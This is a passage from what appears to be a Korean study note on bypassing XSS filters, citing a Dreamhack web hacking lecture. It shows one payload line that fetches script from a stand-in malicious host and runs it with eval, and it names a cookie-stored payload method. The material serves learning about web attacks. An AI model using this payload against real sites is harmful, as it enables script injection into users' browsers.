        // [3] 트워크에서 리소스를 가져오는 프로세스를 시작하고 Response 객체(promise)를 받아오는 fetch() 메소드를 통해 외부 자원으로 요청을 보내고 then() 메소드를 통해 실행할 동작을 정의함 
        fetch('http://malice.sample.com').then(x=>eval(x.text()));
        ```
    - [우회 방법 3] 쿠키에 페이로드를 저장하여 공격하는 방법


<br/><br/><br/><br/>

### 🔖 출처
* [드림핵 Web Hacking Advanced - Client Side] 📌 [Exploit Tech: XSS Filtering Bypass - 1](https://dreamhack.io/lecture/courses/318)
